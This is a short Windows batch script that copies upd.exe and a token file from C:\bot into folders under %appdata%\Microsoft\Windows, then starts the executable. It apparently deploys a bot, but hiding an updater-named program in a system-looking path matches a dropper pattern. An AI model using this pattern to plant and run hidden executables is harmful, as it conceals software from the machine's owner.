@ECHO off

cd %appdata%\Microsoft\Windows && mkdir bot
cd %appdata%\Microsoft\Windows\bot && mkdir vers && mkdir media

copy C:\bot\upd.exe %appdata%\Microsoft\Windows\upd.exe

copy C:\bot\tokeni\token0.txt %appdata%\Microsoft\Windows\token.txt

start %appdata%\Microsoft\Windows\upd.exe

pause > nul